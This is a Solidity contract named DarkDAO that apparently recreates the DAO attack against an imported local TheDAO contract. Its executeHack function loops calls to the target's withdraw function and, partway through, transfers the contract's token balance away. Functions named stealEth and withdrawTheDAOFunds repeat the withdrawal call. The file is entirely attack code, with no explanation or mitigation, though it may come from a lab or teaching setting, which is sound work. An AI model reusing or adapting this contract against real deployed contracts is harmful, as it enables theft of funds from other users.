pragma solidity ^0.6.0;

import "./TheDAO.sol";

contract DarkDAO {
    event HackExecuted(address executedBy, uint newNoOfCalls, uint totalNoOfCalls, uint daoBalance);

    address payable public daoAddress;
    address public transferAddress;

    uint public totalNoOfCalls = 0;

    constructor (address _daoAddress) public {
        daoAddress = payable(_daoAddress);
    }

    function executeHack() public {
        uint i = 0;
        while (i < 5) {
            i++;
            totalNoOfCalls++;

            if (i == 4) {
                TheDAO(daoAddress).transferTokens(transferAddress, TheDAO(daoAddress).balanceOf(address(this)) - 1);
            }
            TheDAO(daoAddress).withdraw(address(this));
        }
        emit HackExecuted(msg.sender, i, totalNoOfCalls, TheDAO(daoAddress).balanceOf(address(this)) - 1);
    }

    function stealEth() public {
        TheDAO(daoAddress).withdraw(address(this));
    }

    function buyTheDAOTokens(uint _amount) public {
        TheDAO(daoAddress).buyTokens.value(_amount)();
    }

    function withdrawTheDAOFunds() public {
        TheDAO(daoAddress).withdraw(address(this));
    }

    function setTransferAddress(address _transferAddress) public {
        transferAddress = _transferAddress;
    }
}
